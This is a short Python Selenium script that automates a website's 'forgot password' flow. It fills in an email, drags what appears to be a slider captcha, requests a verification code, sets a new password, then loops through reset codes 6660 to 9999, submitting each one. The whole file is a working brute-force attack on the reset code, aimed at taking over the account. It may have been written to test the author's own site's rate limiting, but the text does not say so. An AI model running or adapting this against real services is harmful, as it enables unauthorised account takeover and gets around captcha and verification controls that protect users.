from selenium import webdriver
import time
from selenium.webdriver import ActionChains
from selenium.webdriver.common.action_chains import ActionChains
url="https://web.test.com/#/forgetPass/step1"
driver=webdriver.Chrome()
driver.get(url)
driver.maximize_window()
time.sleep(3)
driver.find_element_by_class_name('el-input__inner').send_keys('q@qq.com')
driver.find_element_by_xpath('//*[@id="app"]/div[2]/div/div[2]/div[2]/form/div[3]/div/button').click()
time.sleep(1)
b = driver.find_element_by_xpath('//*[@id="app"]/div[2]/div/div[2]/div[2]/div/div/div[2]/div/div[1]/div[3]')
ActionChains(driver).click_and_hold(b).perform()
c = driver.find_element_by_xpath('//*[@id="app"]/div[2]/div/div[2]/div[2]/div/div/div[1]/button/i')
webdriver.ActionChains(driver).move_to_element(c).perform()
time.sleep(2)
driver.find_element_by_xpath('//*[@id="app"]/div[2]/div/div[2]/div[2]/div/form/div[2]/div/div[1]/div/button/span').click()
time.sleep(3)
driver.find_element_by_xpath('//*[@id="app"]/div[2]/div/div[2]/div[2]/div/form/div[3]/div/div/input').send_keys('a11111111')
driver.find_element_by_xpath('//*[@id="app"]/div[2]/div/div[2]/div[2]/div/form/div[4]/div/div/input').send_keys('a11111111')
for i in range(6660,10000):
    driver.find_element_by_xpath('//*[@id="app"]/div[2]/div/div[2]/div[2]/div/form/div[2]/div/div[1]/input').clear()
    driver.find_element_by_xpath('//*[@id="app"]/div[2]/div/div[2]/div[2]/div/form/div[2]/div/div[1]/input').send_keys(i)
    driver.find_element_by_xpath('//*[@id="app"]/div[2]/div/div[2]/div[2]/div/form/div[6]/div/button').click()
    time.sleep(1)











